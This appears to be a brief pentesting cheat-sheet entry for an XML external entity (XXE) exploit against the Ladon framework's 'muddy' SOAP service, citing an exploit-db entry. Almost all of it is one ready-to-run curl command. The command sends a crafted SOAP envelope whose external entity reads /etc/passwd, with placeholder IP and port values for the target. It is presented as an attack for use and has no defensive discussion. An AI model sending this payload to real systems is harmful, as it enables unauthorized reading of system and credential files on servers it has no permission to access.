# ladon framework

## XXE RCE

```
https://www.exploit-db.com/exploits/43113

# for uid string > 
curl -s -X $'POST' \
-H $'Content-Type: text/xml;charset=UTF-8' \
-H $'SOAPAction: \"http://localhost:PORT/muddy/soap11/checkout\"' \
--data-binary $'<?xml version="1.0"?>
<!DOCTYPE uid
[<!ENTITY kashz SYSTEM "file:///etc/passwd">
]>
<soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"
xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"
xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"
xmlns:urn=\"urn:muddy\"><soapenv:Header/><soapenv:Body>
<urn:checkout soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">
<uid xsi:type=\"xsd:string\">&kashz;</uid>
</urn:checkout></soapenv:Body></soapenv:Envelope>' \
'http://IP:PORT/muddy/soap11' | xmllint --format -
```
